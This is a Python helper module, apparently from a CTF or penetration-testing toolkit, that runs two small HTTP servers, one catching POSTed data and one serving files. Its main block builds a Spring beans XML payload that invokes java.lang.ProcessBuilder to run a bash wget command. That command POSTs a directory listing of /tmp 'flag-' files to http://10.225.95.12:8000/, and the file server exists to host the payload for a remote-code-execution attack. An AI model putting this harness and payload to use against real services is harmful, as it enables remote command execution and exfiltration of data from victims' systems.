import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

module_name = os.path.splitext(os.path.basename(__file__))[0]


def debug_log(msg: str, tag: str = "") -> None:
    if os.environ.get("EXP_DEBUG", "false") == "true":
        log = f"[{module_name}][{tag}] {msg}" if tag else f"[{module_name}] {msg}"
        print(log)


class _BaseHttpServer:
    def __init__(self, port):
        self.host = "0.0.0.0"
        self.port = port
        self._server = None
        self._thread = None

    def _make_handler(self):
        raise NotImplementedError

    def start(self):
        if self._server:
            debug_log("服务器已在运行", f"{self.__class__.__name__}.start")
            return self

        handler = self._make_handler()
        self._server = HTTPServer((self.host, self.port), handler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        debug_log(f"服务器启动成功: {self.host}:{self.port}", f"{self.__class__.__name__}.start")
        return self

    def stop(self):
        if not self._server:
            debug_log("服务器未运行", f"{self.__class__.__name__}.stop")
            return

        self._server.shutdown()
        self._server.server_close()
        if self._thread:
            self._thread.join()
        self._server = None
        self._thread = None
        debug_log("已停止服务器", f"{self.__class__.__name__}.stop")

    def __enter__(self):
        return self.start()

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()
        return False


class HttpEcho(_BaseHttpServer):
    def __init__(self, on_body=None, port=8000):
        super().__init__(port)
        self.on_body = on_body or (lambda body: None)

    def _make_handler(self):
        on_body = self.on_body

        class CustomHandler(BaseHTTPRequestHandler):
            def do_POST(self):
                content_length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_length)

                debug_log(f"收到 POST 请求: path={self.path}, body_length={content_length}, body={body}", "HttpEcho.do_POST")

                try:
                    on_body(body)
                except Exception as e:
                    debug_log(f"on_body 回调执行失败: {e}", "HttpEcho.do_POST")
                    print(f"[!] on_body error: {e}")

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")

            def log_message(self, _format, *args):
                # HTTP 服务器日志通过 debug_log 输出
                debug_log(f"{_format % args}", "HttpEcho.log")

        return CustomHandler


class HttpFile(_BaseHttpServer):
    def __init__(self, files: dict[str, bytes | str], port=8001):
        super().__init__(port)
        self.files = files

    def _make_handler(self):
        files_to_serve = self.files

        class FileDownloadHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                filename = self.path.lstrip("/")
                debug_log(f"收到 GET 请求: path={self.path}, filename={filename}", "HttpFile.do_GET")

                if filename not in files_to_serve:
                    debug_log(f"文件不存在: {filename}", "HttpFile.do_GET")
                    self.send_error(404, "File Not Found")
                    return

                file_data_or_path = files_to_serve[filename]
                try:
                    if isinstance(file_data_or_path, bytes):
                        content = file_data_or_path
                        debug_log(f"从内存读取文件: {filename}, size={len(content)}", "HttpFile.do_GET")
                    elif isinstance(file_data_or_path, str):
                        with open(file_data_or_path, "rb") as f:
                            content = f.read()
                        debug_log(f"从磁盘读取文件: {file_data_or_path}, size={len(content)}", "HttpFile.do_GET")
                    else:
                        raise TypeError("File data must be bytes or a filepath string.")
                except FileNotFoundError:
                    debug_log(f"磁盘文件不存在: {file_data_or_path}", "HttpFile.do_GET")
                    self.send_error(404, "File Not Found on Server Disk")
                    return
                except Exception as e:
                    debug_log(f"读取文件失败: {filename}, error={e}", "HttpFile.do_GET")
                    print(f"[!] Error serving file {filename}: {e}")
                    self.send_error(500, "Internal Server Error")
                    return

                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
                debug_log(f"文件发送成功: {filename}", "HttpFile.do_GET")

            def log_message(self, _format, *args):
                # HTTP 服务器日志通过 debug_log 输出
                debug_log(f"{_format % args}", "HttpFile.log")

        return FileDownloadHandler


if __name__ == "__main__":
    from base import run_cmd, set_debug

    # 开启调试日志
    set_debug()


    def handle_body(body):
        print(f"[收到数据] {body.decode()}")


    # with 用法
    print("\n=== 测试 HttpEcho ===")
    with HttpEcho(handle_body):
        run_cmd("curl http://0.0.0.0:8000 -d 'HttpEcho with debug logs'")
    print("\n=== 测试 HttpFile ===")
    with HttpFile({"abc.txt": b"HttpFile content"}):
        cr = run_cmd("curl http://0.0.0.0:8001/abc.txt -o /tmp/abc.txt;cat /tmp/abc.txt")
        print(f"[下载结果] {cr.output}")



    xml = f"""<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
    <list>
    <value>/bin/bash</value>
    <value>-c</value>
    <value><![CDATA[wget --method=POST --body-data=$(ls /tmp | grep flag-) http://10.225.95.12:8000/]]></value>
    </list>
    </constructor-arg>
    </bean>
    </beans>""".encode()
    files = {"xml.xml": xml}
    print("\n=== 测试传统用法 ===")
    http_echo = HttpEcho(handle_body, port=8000)
    http_echo.start()
    http_file = HttpFile(files, port=8001)
    http_file.start()
    input("服务器运行中，按回车停止...")
    http_echo.stop()
    http_file.stop()